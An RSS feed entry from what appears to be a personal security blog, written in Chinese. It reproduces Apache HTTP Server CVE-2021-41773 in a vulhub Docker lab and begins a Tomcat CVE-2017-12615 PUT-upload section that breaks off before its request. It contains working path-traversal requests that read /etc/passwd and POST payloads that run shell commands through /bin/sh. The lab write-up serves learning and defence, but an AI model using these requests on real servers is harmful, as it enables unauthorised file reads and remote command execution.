<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>golden的部落阁 • Posts by &#34;web&#34; category</title>
        <link>http://blog.g01den.top</link>
        <description>golden的部落阁</description>
        <language>zh-CN</language>
        <pubDate>Mon, 17 Jun 2024 22:14:26 +0800</pubDate>
        <lastBuildDate>Mon, 17 Jun 2024 22:14:26 +0800</lastBuildDate>
        <category>Game</category>
        <category>CVE</category>
        <category>Web</category>
        <category>Daily life</category>
        <category>408</category>
        <category>Java</category>
        <category>Pwn</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">http://blog.g01den.top/posts/2bb7953f.html</guid>
            <title>部分CVE复现Web（1）</title>
            <link>http://blog.g01den.top/posts/2bb7953f.html</link>
            <category>CVE</category>
            <category>Web</category>
            <pubDate>Mon, 17 Jun 2024 22:14:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;apache-http-server-路径穿越漏洞cve-2021-41773&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#apache-http-server-路径穿越漏洞cve-2021-41773&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU5OTc1NDM5L2FydGljbGUvZGV0YWlscy8xMjUyMjU5NDk/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjklMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNzE4NjIwMzk1MTY4MDAyMjc0ODI2MjkmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfY2xpY2t+ZGVmYXVsdC0xLTEyNTIyNTk0OS1udWxsLW51bGwuMTQyJTVFdjEwMCU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTUmYW1wO3V0bV90ZXJtPUNWRS0yMDIxLTQxNzczJmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==&#34;&gt;Apache HTTP Server 路径穿越漏洞 CVE-2021-41773&lt;/span&gt;&lt;/h1&gt;
&lt;p&gt;​	首先，先来看一下这个漏洞的官方描述：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/6a0535188c6e42b49e1bd35d195570e4.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	CVE-2021-41773 是在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击将 URL 映射到预期文档根目录之外的文件，如果文档根目录之外的文件不受 “要求全部拒绝” 的保护，则这些请求可能会成功，如果还为这些别名路径启用了 CGI 脚本，则可以允许远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;漏洞条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞条件&#34;&gt;#&lt;/a&gt; 漏洞条件：&lt;/h2&gt;
&lt;p&gt;​	配置目录遍历，并且开启 cgi mode 2.Apache HTTPd 版本为 2.4.49/2.4.50 3. 存在 cgi-bin 和 icons 文件夹&lt;/p&gt;
&lt;p&gt;​	穿越的目录允许被访问，比如配置了&lt;Directory /&gt;Require all granted&lt;/Directory&gt;。（默认情况下是不允许的：&lt;Directory /&gt;Require all denied&lt;/Directory&gt;）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：这里的 /icons/ 必须是一个存在且可访问的目录&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现：&lt;/h2&gt;
&lt;p&gt;​	首先，需要在虚拟机里下载一个 docker，可以通过&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install docker.io docker-compose&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来安装。&lt;/p&gt;
&lt;p&gt;​	之后，需要下载 vulhub 的环境&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/vulhub/vulhub.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	之后就可以在 vulhub 这个文件夹下的 httpd 找到漏洞编号 CVE-2021-41773 了，然后执行如下命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;即可搭建完成，之后根据它开放的 端口来访问这个服务，&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/847d5ca0e8dc41a383d84062fea18298.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	出现这个页面则表示搭建成功了，之后就可以开始了。&lt;/p&gt;
&lt;p&gt;​	首先，抓包，然后修改请求包如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.209.130:8080&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cache-Control: max-age=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;If-None-Match: &amp;quot;2d-432a5e4a73a80&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;If-Modified-Since: Mon, 11 Jun 2007 18:53:14 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	可以看到，我们请求的路径为 /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd , 那么，为啥这个路径能行呢？可以参考这篇文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2VjcnNzLmNvbS9hcnRpY2xlcy8zNDg5MA==&#34;&gt;Apache HTTP Server 路径穿越漏洞 (CVE-2021-41773) 分析复现&lt;/span&gt;。说白了就是没有对目录进行有效的过滤，导致了可以造成目录穿越直接读取根目录的文件，不过，有的时候可能存在一些个问题，可能需要对 %2e 进行二次 url 编码，这里只是提一句。&lt;/p&gt;
&lt;p&gt;​	发送了请求之后我们能够拿到这个回显：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/1.1 200 OK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Mon, 17 Jun 2024 12:20:37 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Server: Apache/2.4.49 (Unix)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ETag: &amp;quot;39e-5cceec7356000&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Ranges: bytes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 926&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_apt:x:100:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	证明我们成功了，成功读取了文件。&lt;/p&gt;
&lt;p&gt;​	难道，只能这样了吗？&lt;/p&gt;
&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行：&lt;/h2&gt;
&lt;p&gt;​	当然不是，在服务器开启 cgi 或 cgid 模块的情况下，该漏洞可执行任意命令。&lt;/p&gt;
&lt;p&gt;​	如果，当我们修改文件路径为：/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh  时，就会发现，我们输入的 POST 参数会被当做命令进行执行，也就是说，我们直接做到了 RCE 。&lt;/p&gt;
&lt;p&gt;​	给个原因。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;也就是说，通过 POST 传入的 参数，会作为  &lt;code&gt;stdin&lt;/code&gt;  的内容，交给 所访问的 cgi 程序处理&lt;/p&gt;
&lt;p&gt;如果访问的是  &lt;code&gt;/bin/sh&lt;/code&gt;  ，那么就能直接 getshell 了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​	我们给 POST 传入（固定格式） &lt;code&gt;echo Content-Type: text/plain; echo; ls /&lt;/code&gt; ，之后就会发现我们成功读取了文件，我提前在根目录存放了 flag 文件，当作一个 ctf 题目来表明我们做对了这个题。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/1.1 200 OK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Mon, 17 Jun 2024 12:50:01 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Server: Apache/2.4.49 (Unix)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;boot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;etc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;home&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lib64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;media&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mnt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;opt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sbin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	之后我们 POST 传入： &lt;code&gt;echo Content-Type: text/plain; echo; cat /flag&lt;/code&gt; ，最后能够拿到 flag：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTTP/1.1 200 OK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Date: Mon, 17 Jun 2024 12:52:04 GMT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Server: Apache/2.4.49 (Unix)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;CVE-2021-41773&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;tomcat文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tomcat文件上传&#34;&gt;#&lt;/a&gt; Tomcat 文件上传：&lt;/h1&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识：&lt;/h2&gt;
&lt;p&gt;​	&lt;strong&gt;PUT 请求是向服务器端发送数据的，从而改变信息&lt;/strong&gt;，该请求就像数据库的 update 操作一样，用来修改数据的内容，但是不会增加数据的种类等，也就是说无论进行多少次 PUT 操作，其结果并没有不同。&lt;/p&gt;
&lt;p&gt;​	web.xml 主要用来配置 Filter、Listener、Servlet 等。当 readonly 是 true 的话，那么 PUT 和 DELETE 方法是被拒绝的，因此如果手动将 readonly 选项开启为 false，那么就能够通过 PUT 方法上传文件了。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-2&#34;&gt;#&lt;/a&gt; 漏洞复现：&lt;/h2&gt;
&lt;p&gt;​	vulhub 文件夹中的 tomcat 的 CVE-2017-12615 就是漏洞复现的环境。&lt;/p&gt;
&lt;p&gt;​	可以在当前文件夹中使用：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker-compose build&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来启动环境。&lt;/p&gt;
&lt;p&gt;​	访问了之后是如下这个情况：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/9ff98e223dc349098074ad96f83457fa.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;​	那么，首先我们在 docker 里查看我们的题目环境是怎么样的，可以发现 readonly 的值就是 false：&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;&amp;lt;!--   readonly            Is this context &amp;quot;read only&amp;quot;, so HTTP           --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;readonly&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;param-name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;false&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;param-value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;init-param&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	那么，我们就可以通过 PUT 传参来更新文件，大概 http 请求如下：&lt;/p&gt;
